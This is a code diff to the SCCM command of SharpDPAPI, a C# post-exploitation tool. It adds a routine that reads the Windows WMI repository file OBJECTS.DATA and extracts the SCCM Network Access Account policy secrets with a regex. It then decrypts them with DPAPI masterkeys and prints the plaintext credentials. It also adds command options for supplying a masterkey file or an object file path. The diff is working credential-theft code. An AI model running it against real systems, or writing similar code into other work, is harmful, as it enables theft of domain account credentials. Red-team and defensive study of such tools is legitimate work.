@@ -3,12 +3,14 @@ using System.Text;
 using System.Collections.Generic;
 using System.Linq;
 using System.Management;
+using System.Text.RegularExpressions;
+using System.IO;
 
 namespace SharpDPAPI.Commands
 {
     public class SCCM : ICommand
     {
-        public static string CommandName => "SCCM";
+        public static string CommandName => "sccm";
 
         public static ManagementScope NewSccmConnection(string path)
         {
@@ -263,20 +265,99 @@ namespace SharpDPAPI.Commands
 
         }
 
+        public static void ParseFile(string pathToFile, Dictionary<string, string> masterkeys)
+        {
+            string fileData = "";
+            MemoryStream ms = new MemoryStream();
+
+            if (String.IsNullOrEmpty(pathToFile))
+            {
+                string path = @"C:\Windows\System32\wbem\Repository\OBJECTS.DATA";
+
+                using (FileStream fs = new FileStream(path, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
+                using (var sr = new StreamReader(fs, Encoding.Default))
+                {
+                    fileData = sr.ReadToEnd();
+                }
+            }
+            else
+            {
+                Console.WriteLine($"\r\n[*] Path to OBJECTS.DATA file: {pathToFile}\n");
+
+                fileData = File.ReadAllText(pathToFile);
+            }
+
+            Regex regexData = new Regex(@"CCM_NetworkAccessAccount.*<PolicySecret Version=""1""><!\[CDATA\[(.*)\]\]><\/PolicySecret>.*<PolicySecret Version=""1""><!\[CDATA\[(.*)\]\]><\/PolicySecret>", RegexOptions.Multiline | RegexOptions.IgnoreCase | RegexOptions.Compiled);
+            var matchesData = regexData.Matches(fileData);
+
+            if (matchesData.Count <= 0)
+            {
+                Console.WriteLine("\r\n[x] No \"NetworkAccessAccount\" match found!");
+            }
+
+            for (int index = 0; index < matchesData.Count; index++)
+            {
+                for (int idxGroup = 1; idxGroup < matchesData[index].Groups.Count; idxGroup++)
+                {
+                    try
+                    {
+                        string naaPlaintext = "";
+
+                        Console.WriteLine("\r\n[*] Triaging SCCM Network Access Account Credentials\r\n");
+                        naaPlaintext = NAADecrypt(matchesData[index].Groups[idxGroup].Value, masterkeys);
+                        Console.WriteLine("    Plaintext NAA    : {0}", naaPlaintext);
+                        Console.WriteLine();
+                    }
+                    catch (Exception e)
+                    {
+                        Console.WriteLine("[!] Data was not decrypted. An error occurred.");
+                        Console.WriteLine(e.ToString());
+                    }
+
+                }
+            }
+        }
+
         public void Execute(Dictionary<string, string> arguments)
         {
             Console.WriteLine("\r\n[*] Action: SCCM Triage");
             arguments.Remove("SCCM");
 
-            Dictionary<string, string> mappings = Triage.TriageSystemMasterKeys();
-            Console.WriteLine("\r\n[*] SYSTEM master key cache:\r\n");
-            foreach (KeyValuePair<string, string> kvp in mappings)
+            Dictionary<string, string> masterkeys = new Dictionary<string, string>();
+
+            if (arguments.ContainsKey("/mkfile"))
+            {
+                Console.WriteLine("\r\n[*] Using a give masterkeys file");
+                masterkeys = SharpDPAPI.Helpers.ParseMasterKeyFile(arguments["/mkfile"]);
+            }
+            else
+            {
+                Console.WriteLine("\r\n[*] SYSTEM master key cache:\r\n");
+                masterkeys = Triage.TriageSystemMasterKeys();
+            }
+
+            foreach (KeyValuePair<string, string> kvp in masterkeys)
             {
                 Console.WriteLine("{0}:{1}", kvp.Key, kvp.Value);
             }
+
             Console.WriteLine();
 
-            LocalNetworkAccessAccountsWmi(mappings);
+            if (arguments.ContainsKey("/useobjectfile"))
+            {
+                string pathToFile = "";
+
+                if (arguments.ContainsKey("/pathToFile"))
+                {
+                    pathToFile = arguments["/pathToFile"];
+                }
+
+                ParseFile(pathToFile, masterkeys);
+            }
+            else
+            {
+                LocalNetworkAccessAccountsWmi(masterkeys);
+            }
         }
     }
 }
